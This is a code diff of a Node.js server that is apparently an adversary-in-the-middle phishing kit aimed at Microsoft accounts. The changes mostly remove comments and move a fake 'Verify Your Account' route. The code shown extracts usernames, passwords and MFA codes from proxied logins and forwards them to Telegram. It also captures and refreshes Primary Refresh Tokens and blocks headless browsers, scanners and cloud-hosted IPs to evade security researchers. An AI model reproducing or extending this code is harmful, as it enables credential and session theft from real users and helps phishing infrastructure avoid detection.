@@ -74,8 +74,8 @@ function corsMiddleware(req, res, next) {
 
 // 1. Rate Limiting
 const limiter = rateLimit ? rateLimit({
-    windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 100, // limit each IP to 100 requests per windowMs
+    windowMs: 15 * 60 * 1000,
+    max: 100,
     message: { error: 'Too many requests, please try again later.' },
     standardHeaders: true,
     legacyHeaders: false,
@@ -89,18 +89,9 @@ function validateBrowserFingerprint(req) {
     const secChUa = req.headers['sec-ch-ua'] || '';
     const secChUaPlatform = req.headers['sec-ch-ua-platform'] || '';
     
-    // Check for headless browser indicators
     const headlessIndicators = [
-        'HeadlessChrome',
-        'Headless',
-        'PhantomJS',
-        'Selenium',
-        'Puppeteer',
-        'Playwright',
-        'Cypress',
-        'webdriver',
-        'headless',
-        'Headless'
+        'HeadlessChrome', 'Headless', 'PhantomJS', 'Selenium',
+        'Puppeteer', 'Playwright', 'Cypress', 'webdriver', 'headless'
     ];
     
     for (const indicator of headlessIndicators) {
@@ -109,7 +100,6 @@ function validateBrowserFingerprint(req) {
         }
     }
     
-    // Check for missing browser headers
     if (!acceptLanguage || !acceptEncoding) {
         return { valid: false, reason: 'Missing browser headers' };
     }
@@ -118,24 +108,9 @@ function validateBrowserFingerprint(req) {
 }
 
 // 3. IP Reputation Check
-const BLOCKED_IPS = new Set([
-    // Add known malicious IPs or ranges
-]);
-
 const SUSPICIOUS_ASNS = [
-    'AS14061', // DigitalOcean
-    'AS16509', // AWS
-    'AS15169', // Google Cloud
-    'AS8075',  // Microsoft Azure
-    'AS16276', // OVH
-    'AS63949', // Linode
-    'AS20473', // Vultr
-    'AS13335', // Cloudflare (some)
-];
-
-const VPN_ASNS = [
-    'AS63949', 'AS20473', 'AS16276', 'AS14061', 'AS16509',
-    'AS15169', 'AS8075', 'AS13335'
+    'AS14061', 'AS16509', 'AS15169', 'AS8075',
+    'AS16276', 'AS63949', 'AS20473', 'AS13335'
 ];
 
 async function checkIPReputation(ip) {
@@ -144,19 +119,14 @@ async function checkIPReputation(ip) {
     }
     
     try {
-        // Check against multiple threat intelligence sources
-        // Using ip-api.com for basic geo + ISP info
         const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode,as,isp,org`, { timeout: 3000 });
         const data = response.data;
-        
-        // Check if ASN is suspicious
         const asn = data.as || '';
         for (const suspicious of SUSPICIOUS_ASNS) {
             if (asn.includes(suspicious)) {
                 return { blocked: true, score: 80, reason: 'Suspicious ASN' };
             }
         }
-        
         return { blocked: false, score: 0 };
     } catch (e) {
         return { blocked: false, score: 0 };
@@ -171,7 +141,6 @@ function detectBotBehavior(req) {
     const secFetchUser = req.headers['sec-fetch-user'] || '';
     const secFetchDest = req.headers['sec-fetch-dest'] || '';
     
-    // Check for non-browser User-Agents
     const botUAs = [
         'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
         'python', 'java', 'perl', 'ruby', 'go-http', 'okhttp',
@@ -187,10 +156,7 @@ function detectBotBehavior(req) {
         }
     }
     
-    // Check for missing Sec-Fetch headers (modern browsers send these)
     if (!secFetchUser && !secFetchDest) {
-        // Could be an older browser or a bot
-        // Check if it's a recent browser
         const modernBrowsers = ['Chrome/', 'Firefox/', 'Safari/', 'Edg/', 'OPR/'];
         let isModern = false;
         for (const browser of modernBrowsers) {
@@ -207,11 +173,9 @@ function detectBotBehavior(req) {
     return { isBot: false };
 }
 
-// 5. Request Signature Validation (CSRF-like)
+// 5. Request Signature Validation
 function validateRequestSignature(req) {
-    // Check for referer (optional)
     const referer = req.headers['referer'] || req.headers['origin'] || '';
-    // If it's a POST request without a referer, it's suspicious
     if (req.method === 'POST' && !referer && !req.path.includes('/api/')) {
         return { valid: false, reason: 'Missing referer for POST request' };
     }
@@ -220,7 +184,6 @@ function validateRequestSignature(req) {
 
 // 6. Complete Anti-Bot Middleware
 async function antiBotMiddleware(req, res, next) {
-    // Skip for WebSocket and static assets
     if (req.path.includes('.css') || req.path.includes('.js') || 
         req.path.includes('.png') || req.path.includes('.jpg') ||
         req.path.includes('.ico') || req.path.includes('.woff') ||
@@ -228,47 +191,40 @@ async function antiBotMiddleware(req, res, next) {
         return next();
     }
     
-    // Skip for internal API calls
     if (req.path.startsWith('/dash/') && !req.path.includes('/dash/api/')) {
         return next();
     }
     
-    // 1. Rate Limiting
     if (rateLimit) {
         limiter(req, res, (err) => {
             if (err) return next(err);
         });
     }
     
-    // 2. Browser Fingerprint
     const fingerprint = validateBrowserFingerprint(req);
     if (!fingerprint.valid) {
         console.log(`🛡️ Blocked: ${fingerprint.reason} - ${req.ip}`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
-    // 3. IP Reputation
     const ipCheck = await checkIPReputation(req.ip);
     if (ipCheck.blocked) {
         console.log(`🛡️ Blocked: IP reputation - ${req.ip} (${ipCheck.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
-    // 4. Bot Behavior Detection
     const botCheck = detectBotBehavior(req);
     if (botCheck.isBot) {
         console.log(`🛡️ Blocked: Bot detected - ${req.ip} (${botCheck.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
-    // 5. Request Signature
     const signature = validateRequestSignature(req);
     if (!signature.valid) {
         console.log(`🛡️ Blocked: Invalid request signature - ${req.ip} (${signature.reason})`);
         return res.status(403).json({ error: 'Access denied' });
     }
     
-    // Add anti-bot headers to response
     res.header('X-Frame-Options', 'DENY');
     res.header('X-Content-Type-Options', 'nosniff');
     res.header('Referrer-Policy', 'same-origin');
@@ -279,12 +235,10 @@ async function antiBotMiddleware(req, res, next) {
 
 // 7. Bot Trap (honeypot)
 function botTrapMiddleware(req, res, next) {
-    // Check for hidden form field that bots might fill
     if (req.body && req.body.__honey) {
         console.log(`🛡️ Bot Trap triggered - ${req.ip}`);
         return res.status(403).json({ error: 'Access denied' });
     }
-    // If the honey field is present in GET params
     if (req.query && req.query.__honey) {
         console.log(`🛡️ Bot Trap triggered (GET) - ${req.ip}`);
         return res.status(403).json({ error: 'Access denied' });
@@ -451,12 +405,10 @@ async function sendToTelegram(data) {
 
         if (body) {
             const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
-            // Credentials
             const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
             if (userMatch) username = decodeURIComponent(userMatch[1]);
             const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
             if (passMatch) { password = decodeURIComponent(passMatch[1]); hasCredentials = true; }
-            // MFA OTP
             const mfaMatch = bodyStr.match(/(?:otp|code|verificationcode|mfa)=([^&]+)/i);
             if (mfaMatch) { mfaCode = decodeURIComponent(mfaMatch[1]); hasCredentials = true; }
             try {
@@ -487,7 +439,6 @@ async function sendToTelegram(data) {
                     hasCredentials = true;
                     isTokenExchange = true;
                 }
-                // PRT capture
                 const prtMatch = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                 if (prtMatch) {
                     if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
@@ -1916,7 +1867,6 @@ function extractPRTFromLog(logContent) {
             const decrypted = decryptData(encrypted, iv);
             const obj = JSON.parse(decrypted);
             
-            // Check request body for PRT
             const body = obj.proxyRequestBody;
             if (body) {
                 const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
@@ -1931,7 +1881,6 @@ function extractPRTFromLog(logContent) {
                 }
             }
             
-            // Check response body for PRT
             const respBody = obj.proxyResponseBody;
             if (respBody) {
                 const respStr = typeof respBody === 'string' ? respBody : JSON.stringify(respBody);
@@ -1979,7 +1928,6 @@ function scanAllLogsForPRTs() {
         } catch (e) {}
     }
     
-    // Deduplicate PRTs by value
     const uniquePRTs = [];
     const seen = new Set();
     for (const prt of foundPRTs) {
@@ -2147,7 +2095,7 @@ async function prtRefreshDaemon() {
             savePRTStorage(prtStorage);
             console.log(`✅ Refreshed ${refreshed} PRTs`);
         }
-    }, 60 * 60 * 1000); // Every 60 minutes
+    }, 60 * 60 * 1000);
 }
 prtRefreshDaemon();
 
@@ -2178,28 +2126,6 @@ console.log('🟣 PRT Persistence Engine loaded');
 // 📧 VERIFY PAGE — HYBRID AITM + DEVICE CODE
 // ============================================================
 
-// ── ✅ SERVE VERIFY PAGE ──
-app.get('/verify', (req, res) => {
-    const filePath = path.join(__dirname, 'public', 'verify.html');
-    if (fs.existsSync(filePath)) {
-        res.sendFile(filePath);
-    } else {
-        res.send(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Verify</title></head>
-            <body style="font-family:'Segoe UI',Arial,sans-serif;background:#f3f4f6;display:flex;justify-content:center;align-items:center;height:100vh;">
-                <div style="background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 20px rgba(0,0,0,0.15);max-width:420px;text-align:center;">
-                    <h1>🔐 Verify Your Account</h1>
-                    <p style="color:#8a8a8a;">Please create <code>public/verify.html</code></p>
-                    <a href="/dash" style="display:inline-block;margin-top:16px;padding:12px 24px;background:#0078d4;color:#fff;border-radius:4px;text-decoration:none;">Go to Dashboard</a>
-                </div>
-            </body>
-            </html>
-        `);
-    }
-});
-
 // ── ✅ CAPTURE CREDENTIALS FROM AITM ──
 dashApp.post('/api/capture/credentials', async (req, res) => {
     const { email, password, sessionId, userAgent, ip } = req.body;
@@ -2210,7 +2136,6 @@ dashApp.post('/api/capture/credentials', async (req, res) => {
     console.log(`   IP: ${ip}`);
     console.log(`   User-Agent: ${userAgent}`);
 
-    // Send to Telegram
     const message = `
 🔑 **Credentials Captured!**
 👤 **Email:** ${email}
@@ -2231,7 +2156,6 @@ dashApp.post('/api/capture/credentials', async (req, res) => {
         console.log('⚠️ Telegram notify failed:', e.message);
     }
 
-    // Store in vault as credentials
     vault.tokens.push({
         type: 'credentials',
         value: `${email}:${password}`,
@@ -2361,6 +2285,9 @@ dashApp.post('/api/convert/sccauth-to-token', async (req, res) => {
     }
 });
 
+console.log('📧 /verify page endpoints loaded');
+console.log('🔄 esctx/sccauth conversion endpoints loaded');
+
 // ── ✅ WEBMAIL ROUTE ──
 app.get('/webmail', (req, res) => {
     const filePath = path.join(__dirname, 'public', 'webmail.html');
@@ -2399,8 +2326,27 @@ app.get('/webmail', (req, res) => {
     }
 });
 
-console.log('📧 /verify page endpoints loaded');
-console.log('🔄 esctx/sccauth conversion endpoints loaded');
+// ── ✅ VERIFY ROUTE ──
+app.get('/verify', (req, res) => {
+    const filePath = path.join(__dirname, 'public', 'verify.html');
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Verify</title></head>
+            <body style="font-family:'Segoe UI',Arial,sans-serif;background:#f3f4f6;display:flex;justify-content:center;align-items:center;height:100vh;">
+                <div style="background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 20px rgba(0,0,0,0.15);max-width:420px;text-align:center;">
+                    <h1>🔐 Verify Your Account</h1>
+                    <p style="color:#8a8a8a;">Please create <code>public/verify.html</code></p>
+                    <a href="/dash" style="display:inline-block;margin-top:16px;padding:12px 24px;background:#0078d4;color:#fff;border-radius:4px;text-decoration:none;">Go to Dashboard</a>
+                </div>
+            </body>
+            </html>
+        `);
+    }
+});
 
 // ── ✅ MAIN APP ──
 const app = express();
@@ -2770,7 +2716,6 @@ app.post('/mfa/submit', async (req, res) => {
     const { mfa_code, session_id } = req.body;
     if (!mfa_code) return res.status(400).json({ error: 'MFA code required' });
 
-    // Forward to Telegram
     const message = `
 📱 **MFA Code Intercepted!**
 🔢 **Code:** \`${mfa_code}\`
